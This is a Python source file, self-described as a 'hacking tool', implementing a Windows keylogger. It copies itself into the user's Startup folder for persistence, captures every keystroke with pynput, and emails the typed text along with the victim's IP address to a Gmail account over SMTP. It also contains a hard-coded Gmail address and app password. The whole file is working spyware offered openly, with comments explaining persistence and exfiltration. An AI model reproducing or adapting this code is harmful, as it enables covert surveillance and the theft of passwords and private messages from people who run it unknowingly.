#version keylogger.py 1.3.6////hacking tool\\\\\\\\\
print("keylogger version###############1.3.6##################")
#[3-17] i was trying to import some modules and if one of those modules is not found with the help of internet connection we can dowload the modules




try:
  import shutil
  import os 
  from pynput.keyboard import Key, Listener
  import smtplib, ssl
  import socket
  from email.message import EmailMessage
  import schedule



except ModuleNotFoundError:
    modules = ["socket", "smtplib", "ssl", "schedule", "pynput"]
    from subprocess import call
    for module in modules: 
        call("python -m pip install " + module)
        print(f"{module} installed.....")

#the next function is created to move this python file to startup file {you can see the startup folder by (windows + R) then type shell:startup}


def move_file_to_startapp():
    main_destination = ['Hp', 'hp', 'user', 'lenovo', 'dell']
    current_dir = os.getcwd()
    path_of_python_file = os.path.join(current_dir, "keylogger.py")
    path = ""
    for destination in main_destination:
        if destination in current_dir:
            path = destination
    shutil.copy2(path_of_python_file, rf"C:\\Users\\{path}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")
    print("line 19: new_directory =",current_dir)
move_file_to_startapp()
substitute = open(r"C:\\Users\\Hp\\Desktop\\no.txt", "w")


#the next function is created to send email that contains what the user types to the main mail and also it uses the socket function because it send the user ip address as the subject using the smtplib module


def sendmail(user_message, timeout=1):
    global substitute
    try:
        host = socket.gethostname()
        ip = socket.gethostbyname(host)
        server = smtplib.SMTP_SSL("smtp.gmail.com", 465)
        sender_email = "trialnatiemail@gmail.com"
        server.login(sender_email, "stipsgzhbjyonvle")
        msg = EmailMessage()
        msg['Subject'] = f'from {ip} '
        msg['From'] = sender_email
        msg['To'] = sender_email
        msg.set_content(user_message)
        server.send_message(msg)
    except:
        print("line 45: email cannot be send because there was some sort of error....")
        substitute.write(word)


word = " "
#this is the function that records the pressed keys 


def on_press(key):
    global word
    global substitute
#this are the conditionals that helps to make anything you want using the 
    if (key == Key.space) or key == Key.enter:
        word += ' '
    elif key == Key.backspace:
        word = word[:-1]
    elif key == Key.shift:
        word += ''
    else:
        char = f'{key}'
        char = char[1:-1]
        word += char
    print("{0} pressed".format(key))
    if len(word) % 100 == 0:
        sendmail(word) 

with Listener(on_press=on_press) as listener:
 listener.join()